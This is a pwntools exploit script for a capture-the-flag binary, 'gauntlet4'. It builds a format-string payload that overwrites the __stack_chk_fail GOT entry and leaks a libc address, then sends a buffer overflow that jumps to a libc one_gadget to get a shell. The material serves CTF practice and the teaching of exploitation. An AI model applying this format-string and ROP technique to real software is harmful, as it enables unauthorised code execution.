from pwn import *

#init

e = ELF('./gauntlet4')
libc = ELF('./libc-2.27.so')

p = process(e.path)
#p = remote('gauntlet4.lit-ctf-2021-2-codelab.kctf.cloud', 1337)

#vars

ret_gadget = 0x400596
stkchk_got = e.got['__stack_chk_fail']
strt_main_off = libc.symbols['__libc_start_main']
one_gadget = 0x4f3c2

log.info('Ret gadget adr: ' + hex(ret_gadget))
log.info('Stkchk got adr: ' + hex(stkchk_got))
log.info('Strt main libc off: ' + hex(strt_main_off))
log.info('One gadget libc off: ' + hex(one_gadget))

#exploit

#fmtstr write to stack adr then write ret gadget to stkchk got adr while leak libc
#cannot use position formatters as they cause stack to be copied, but we use modifed stack

s = '%c' * 12
s += '%' + str(stkchk_got - 12) + 'c'
s += '%lln'
s += '%c' * 10
s += '#%p#'
s += '%' + str((ret_gadget - stkchk_got - 26) & 0xffff) + 'c'
s += '%hn'
s += '#'

gdb.attach(p)

p.sendline(s)

p.recvuntil('#')
libc_off = int(p.recvuntil('#', drop = True), 16) - strt_main_off - 231
p.recvuntil('#')

log.info('Libc off: ' + hex(libc_off))

#rop to one gadget with stkchk ignored

p.sendline(b'a' * 0x78 + p64(libc_off + one_gadget))

#pray for flag

p.interactive()
